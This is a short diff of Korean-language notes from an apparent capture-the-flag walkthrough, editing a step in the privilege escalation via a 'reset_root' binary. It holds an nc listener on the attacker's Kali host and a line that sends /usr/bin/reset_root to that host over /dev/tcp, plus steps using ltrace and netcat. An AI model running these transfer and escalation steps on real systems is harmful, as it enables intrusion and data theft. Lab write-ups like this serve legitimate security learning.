@@ -90,7 +90,7 @@ nc -lvnp 3333 > reset_root
 cli 
 cat /usr/bin/reset_root > /dev/tcp/kali ip/3333 -> 칼리에서 연결 확인(암호화해서 입력하면됨)
 
-kali 터미널에서 reset_root 파일 존재 확인 - cat reset_root
+kali 터미널에서 reset_root 파일 존재 확인 - cat reset_root -> chmod 755 수정
 ltrace ./reset_root -> 3개 파일 확인
 netcat에서 3개 파일 생성
 touch 경로+파일
